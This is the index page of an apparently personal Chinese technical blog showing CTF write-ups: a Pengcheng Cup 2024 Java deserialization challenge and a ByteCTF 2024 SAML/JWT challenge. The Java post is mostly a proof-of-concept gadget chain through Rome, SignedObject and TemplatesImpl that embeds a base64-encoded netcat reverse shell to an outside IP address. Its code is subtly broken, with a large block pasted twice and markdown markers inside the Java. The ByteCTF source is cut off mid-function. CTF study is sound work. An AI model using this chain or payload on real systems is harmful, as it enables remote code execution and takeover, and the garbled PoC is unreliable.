<!DOCTYPE html>
<html lang="zh">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 7.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="Charger0">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="Charger0">
<meta property="og:locale">
<meta property="article:author" content="Charger0">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh'
  };
</script>

  <title>Charger0</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Charger0</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">技术记录</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/11/11/hello-world/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Charger0">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Charger0">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/11/11/hello-world/" class="post-title-link" itemprop="url">Hello World</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-11-11 15:26:58" itemprop="dateCreated datePublished" datetime="2024-11-11T15:26:58+08:00">2024-11-11</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/11/10/%E9%B9%8F%E5%9F%8E%E6%9D%AF2024%20java/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Charger0">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Charger0">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/11/10/%E9%B9%8F%E5%9F%8E%E6%9D%AF2024%20java/" class="post-title-link" itemprop="url">鹏城杯 2024 java</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-11-11 03:38:24" itemprop="dateCreated datePublished" datetime="2024-11-11T03:38:24+08:00">2024-11-11</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-11-13 17:51:55" itemprop="dateModified" datetime="2024-11-13T17:51:55+08:00">2024-11-13</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="题目信息"><a href="#题目信息" class="headerlink" title="题目信息"></a>题目信息</h2><p><img src="/../imgs/$%7Bfiilename%7D/image-20241112155540909.png" alt="image-20241112155540909"></p>
<p><img src="/../imgs/$%7Bfiilename%7D/wps2.jpg" alt="img"> </p>
<p>com.backdoor.classes.hello#hashCode调用com.backdoor.classes.hello#eval 调用com.backdoor.classes.look#runcmd</p>
<p>com.backdoor.classes.look#runcmd里看到了jndi。</p>
<p>出题人可能想让sink点是runcmd。</p>
<p>Util这里限制了resolveclass</p>
<p><img src="/../imgs/$%7Bfiilename%7D/wps3.jpg" alt="c"> </p>
<p>resolveclass用二次反序列化绕过</p>
<p>有rome依赖，用rome进二次反序列化 ，进而Templateimpl</p>
<p><img src="/../imgs/$%7Bfiilename%7D/wps4.jpg" alt="img"> </p>
<h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">最终poc</span><br><span class="line"></span><br><span class="line">String AbstractTranslet=&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;;</span><br><span class="line">String TemplatesImpl=&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;;</span><br><span class="line"></span><br><span class="line">// 创建恶意类</span><br><span class="line">ClassPool classPool = ClassPool.**getDefault**();</span><br><span class="line">classPool.appendClassPath(AbstractTranslet);</span><br><span class="line">CtClass ctClass = classPool.makeClass(&quot;d&quot;);</span><br><span class="line">ctClass.setSuperclass(classPool.get(AbstractTranslet));</span><br><span class="line">ctClass.makeClassInitializer().setBody(&quot;java.lang.Runtime.getRuntime().exec(\&quot;bash -c &#123;echo,bmMgMTM5LjIyNC4xMzAuMTgzIDEwMDAyIC1lIHNo&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\&quot;);&quot;);</span><br><span class="line">byte[] bytes = ctClass.toBytecode();</span><br><span class="line"></span><br><span class="line">// 创建TemplatesImpl对象</span><br><span class="line">Object templateImpl = Class.**forName**(TemplatesImpl).getDeclaredConstructor(new Class[]&#123;&#125;).newInstance();</span><br><span class="line">**setFiled**(templateImpl, &quot;_bytecodes&quot;, new byte[][]&#123;bytes&#125;);</span><br><span class="line">**setFiled**(templateImpl, &quot;_name&quot;, &quot;test&quot;);</span><br><span class="line">**setFiled**(templateImpl, &quot;_tfactory&quot;, null);</span><br><span class="line">//SignedObject的初始化，涉及PrivateKey以及Signature对象的处理,signedObject中对于此项的设置我们可以参考Java.security.interface中的几个密钥接口，这里的初始化赋值就是在赋值何种格式的密钥</span><br><span class="line">ObjectBean objectBean = new ObjectBean(ObjectBean.class, new ObjectBean(String.class, &quot;rand&quot;));</span><br><span class="line">HashMap hashMap = new HashMap();</span><br><span class="line">hashMap.put(objectBean, &quot;rand&quot;);</span><br><span class="line">ObjectBean expObjectBean = new ObjectBean(Templates.class, templateImpl);</span><br><span class="line">**setFieldValue**(objectBean, &quot;_equalsBean&quot;, new EqualsBean(ObjectBean.class, expObjectBean));</span><br><span class="line"></span><br><span class="line">KeyPairGenerator kpg = KeyPairGenerator.**getInstance**(&quot;DSA&quot;);</span><br><span class="line">kpg.initialize(1024);</span><br><span class="line">KeyPair kp = kpg.generateKeyPair();</span><br><span class="line">SignedObject signedObject=new SignedObject(hashMap, kp.getPrivate(),Signature.**getInstance**(&quot;DSA&quot;));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">**setFiled**(templateImpl, &quot;_tfactory&quot;, null);</span><br><span class="line">//SignedObject的初始化，涉及PrivateKey以及Signature对象的处理,signedObject中对于此项的设置我们可以参考Java.security.interface中的几个密钥接口，这里的初始化赋值就是在赋值何种格式的密钥</span><br><span class="line">ObjectBean objectBean = new ObjectBean(ObjectBean.class, new ObjectBean(String.class, &quot;rand&quot;));</span><br><span class="line">HashMap hashMap = new HashMap();</span><br><span class="line">hashMap.put(objectBean, &quot;rand&quot;);</span><br><span class="line">ObjectBean expObjectBean = new ObjectBean(Templates.class, templateImpl);</span><br><span class="line">**setFieldValue**(objectBean, &quot;_equalsBean&quot;, new EqualsBean(ObjectBean.class, expObjectBean));</span><br><span class="line"></span><br><span class="line">KeyPairGenerator kpg = KeyPairGenerator.**getInstance**(&quot;DSA&quot;);</span><br><span class="line">kpg.initialize(1024);</span><br><span class="line">KeyPair kp = kpg.generateKeyPair();</span><br><span class="line">SignedObject signedObject=new SignedObject(hashMap, kp.getPrivate(),Signature.**getInstance**(&quot;DSA&quot;));</span><br><span class="line">//Rome</span><br><span class="line">ToStringBean toStringBean = new ToStringBean(SignedObject.class, signedObject);</span><br><span class="line">BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(&quot;&quot;);</span><br><span class="line">**setFieldValue**(badAttributeValueExpException,&quot;val&quot;,toStringBean);</span><br><span class="line"></span><br><span class="line">//执行序列化和反序列化操作，并且返回序列化数据用于后续的payload生成</span><br><span class="line">String s = **serialize2Base64**(badAttributeValueExpException);</span><br><span class="line"></span><br><span class="line">byte[] serializedData = Base64.**getMimeDecoder**().decode(s);</span><br><span class="line">String option = **deserializeData**(serializedData);</span><br><span class="line">return s;</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/11/10/ByteCTF2024_ezauth/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Charger0">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Charger0">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/11/10/ByteCTF2024_ezauth/" class="post-title-link" itemprop="url">bytectf2024 ezauth</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-11-11 03:38:24" itemprop="dateCreated datePublished" datetime="2024-11-11T03:38:24+08:00">2024-11-11</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-11-12 15:27:09" itemprop="dateModified" datetime="2024-11-12T15:27:09+08:00">2024-11-12</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="质量超高的一题，而且很有意思。"><a href="#质量超高的一题，而且很有意思。" class="headerlink" title="质量超高的一题，而且很有意思。"></a>质量超高的一题，而且很有意思。</h1><h1 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">    &quot;crypto/rand&quot;</span><br><span class="line">    &quot;errors&quot;</span><br><span class="line">    &quot;net/http&quot;</span><br><span class="line">    &quot;os&quot;</span><br><span class="line">    &quot;time&quot;</span><br><span class="line"></span><br><span class="line">    &quot;github.com/RobotsAndPencils/go-saml&quot;</span><br><span class="line">    &quot;github.com/gin-gonic/gin&quot;</span><br><span class="line">    &quot;github.com/golang-jwt/jwt/v4&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">// 定义自定义的JWT声明结构体，包含标准的声明和用户名</span><br><span class="line">type MyCustomClaims struct &#123;</span><br><span class="line">    jwt.StandardClaims</span><br><span class="line">    Username string `json:&quot;username&quot;`</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 生成随机字符串函数，n是字符串长度</span><br><span class="line">func generateRandomString(n int) string &#123;</span><br><span class="line">    const letters = &quot;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&quot;</span><br><span class="line">    bytes := make([]byte, n) // 创建长度为n的字节数组</span><br><span class="line">    if _, err := rand.Read(bytes); err != nil &#123;</span><br><span class="line">        return &quot;&quot; // 如果生成随机字节失败，则返回空字符串</span><br><span class="line">    &#125;</span><br><span class="line">    for i, b := range bytes &#123;</span><br><span class="line">        bytes[i] = letters[b%byte(len(letters))] // 将字节映射到字母表中</span><br><span class="line">    &#125;</span><br><span class="line">    return string(bytes) // 返回生成的随机字符串</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 定义全局变量secret_key（用于JWT签名的密钥）和random_code（随机验证码）</span><br><span class="line">var secret_key = generateRandomString(20)</span><br><span class="line">var random_code = generateRandomString(10)</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">    r := gin.Default() // 创建默认的Gin路由引擎</span><br><span class="line"></span><br><span class="line">    // 定义一个POST路由处理SAML断言请求</span><br><span class="line">    r.POST(&quot;/acs&quot;, func(c *gin.Context) &#123;</span><br><span class="line">        // 配置SAML服务提供商的设置</span><br><span class="line">        sp := saml.ServiceProviderSettings&#123;</span><br><span class="line">            PublicCertPath:              &quot;/usr/src/app/cert/default.crt&quot;,          // 公钥证书路径</span><br><span class="line">            PrivateKeyPath:              &quot;/usr/src/app/cert/default.key&quot;,          // 私钥路径</span><br><span class="line">            IDPSSOURL:                   &quot;http://idp/saml2&quot;,                       // 身份提供商的SSO URL</span><br><span class="line">            IDPSSODescriptorURL:         &quot;http://idp/issuer&quot;,                      // 身份提供商的描述符URL</span><br><span class="line">            IDPPublicCertPath:           &quot;/usr/src/app/cert/idpcert.crt&quot;,          // 身份提供商的公钥证书路径</span><br><span class="line">            SPSignRequest:               true,                                     // 是否签署请求</span><br><span class="line">            AssertionConsumerServiceURL: &quot;http://localhost:8000/saml_consume&quot;,     // SP的断言消费者服务URL</span><br><span class="line">        &#125;</span><br><span class="line">        sp.Init() // 初始化SAML服务提供商设置</span><br><span class="line"></span><br><span class="line">        // 从POST表单中获取SAML响应</span><br><span class="line">        encodedXML := c.PostForm(&quot;SAMLResponse&quot;)</span><br><span class="line">        if encodedXML == &quot;&quot; &#123;</span><br><span class="line">            // 如果SAML响应为空，返回错误</span><br><span class="line">            c.JSON(http.StatusBadRequest, gin.H&#123;&quot;error&quot;: &quot;SAMLResponse form value missing&quot;&#125;)</span><br><span class="line">            return</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // 解析SAML响应</span><br><span class="line">        response, err := saml.ParseEncodedResponse(encodedXML)</span><br><span class="line">        if err != nil &#123;</span><br><span class="line">            // 如果解析失败，返回错误</span><br><span class="line">            c.JSON(http.StatusBadRequest, gin.H&#123;&quot;error&quot;: &quot;SAMLResponse parse: &quot; + err.Error()&#125;)</span><br><span class="line">            return</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // 验证SAML响应</span><br><span class="line">        err = response.Validate(&amp;sp)</span><br><span class="line">        if err != nil &#123;</span><br><span class="line">            // 如果验证失败，返回错误</span><br><span class="line">            c.JSON(http.StatusBadRequest, gin.H&#123;&quot;error&quot;: &quot;SAMLResponse validation: &quot; + err.Error()&#125;)</span><br><span class="line">            return</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // 获取SAML响应中的用户标识符uid</span><br><span class="line">        samlID := response.GetAttribute(&quot;uid&quot;)</span><br><span class="line">        if samlID == &quot;&quot; &#123;</span><br><span class="line">            // 如果uid缺失，返回错误</span><br><span class="line">            c.JSON(http.StatusBadRequest, gin.H&#123;&quot;error&quot;: &quot;SAML attribute identifier uid missing&quot;&#125;)</span><br><span class="line">            return</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // 定义JWT声明，设置过期时间为7天</span><br><span class="line">        claims := MyCustomClaims&#123;</span><br><span class="line">            jwt.StandardClaims&#123;</span><br><span class="line">                ExpiresAt: time.Now().Add(time.Hour * 24 * 7).Unix(), // 过期时间</span><br><span class="line">                Issuer:    &quot;bytectf&quot;,                                  // 发行者</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;guest&quot;, // 用户名</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // 使用HS256签名方法生成JWT令牌</span><br><span class="line">        token := jwt.NewWithClaims(jwt.SigningMethodHS256, claims)</span><br><span class="line">        tokenString, _ := token.SignedString([]byte(secret_key)) // 使用密钥签名生成token字符串</span><br><span class="line"></span><br><span class="line">        // 返回生成的JWT令牌和随机验证码</span><br><span class="line">        c.JSON(http.StatusOK, gin.H&#123;</span><br><span class="line">            &quot;token&quot;: tokenString,</span><br><span class="line">            &quot;code&quot;:  random_code,</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    // 定义受JWT认证保护的路由组</span><br><span class="line">    auth := r.Group(&quot;/&quot;)</span><br><span class="line">    auth.Use(jwtauth()) // 使用JWT认证中间件</span><br><span class="line">    &#123;</span><br><span class="line">        // 受保护的/admin路由</span><br><span class="line">        auth.GET(&quot;/admin&quot;, func(c *gin.Context) &#123;</span><br><span class="line">            username, _ := c.Get(&quot;username&quot;) // 获取JWT中的用户名</span><br><span class="line">            code := c.Query(&quot;code&quot;)          // 获取请求中的code参数</span><br><span class="line">            if username == &quot;admin&quot; &amp;&amp; code == random_code &#123;</span><br><span class="line">                // 如果用户名为admin且code匹配，返回flag文件内容</span><br><span class="line">                flag, _ := os.ReadFile(&quot;/flag.txt&quot;)</span><br><span class="line">                c.JSON(http.StatusOK, gin.H&#123;</span><br><span class="line">                    &quot;message&quot;: &quot;Welcome, admin! This is flag:&quot; + string(flag),</span><br><span class="line">                &#125;)</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                // 否则返回未授权的错误</span><br><span class="line">                c.JSON(http.StatusUnauthorized, gin.H&#123;</span><br><span class="line">                    &quot;message&quot;: &quot;Unauthorized&quot;,</span><br><span class="line">                &#125;)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 定义根路由，返回欢迎消息</span><br><span class="line">    r.GET(&quot;/&quot;, func(c *gin.Context) &#123;</span><br><span class="line">        c.String(http.StatusOK, &quot;Hello ByteCTF 2024! Please check in.&quot;)</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    // 启动服务器，监听58080端口</span><br><span class="line">    r.Run(&quot;:58080&quot;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// JWT认证中间件函数</span><br><span class="line">func jwtauth() gin.HandlerFunc &#123;</span><br><span class="line">    return func(c *gin.Context) &#123;</span><br><span class="line">        token := c.GetHeader(&quot;Authorization&quot;) // 获取请求头中的Authorization字段</span><br><span class="line">        if token == &quot;&quot; &#123;</span><br><span class="line">            // 如果没有提供token，返回未授权</span><br><span class="line">            c.JSON(401, gin.H&#123;</span><br><span class="line">                &quot;message&quot;: &quot;Unauthorized&quot;,</span><br><span class="line">            &#125;)</span><br><span class="line">            c.Abort() // 中断请求</span><br><span class="line">            return</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        claims := &amp;MyCustomClaims&#123;&#125; // 初始化自定义声明结构</span><br><span class="line">        tk, err := jwt.ParseWithClaims(token, claims, func(token *jwt.Token) (interface&#123;&#125;, error) &#123;</span><br><span class="line">            return []byte(secret_key), nil // 使用密钥解析JWT</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">        if err != nil &amp;&amp; !errors.Is(err, jwt.ErrTokenExpired) &#123;</span><br><span class="line">            // 如果解析失败并且不是因为过期错误，返回错误信息</span><br><span class="line">            c.JSON(401, gin.H&#123;</span><br><span class="line">                &quot;message&quot;: err.Error(),</span><br><span class="line">            &#125;)</span><br><span class="line">            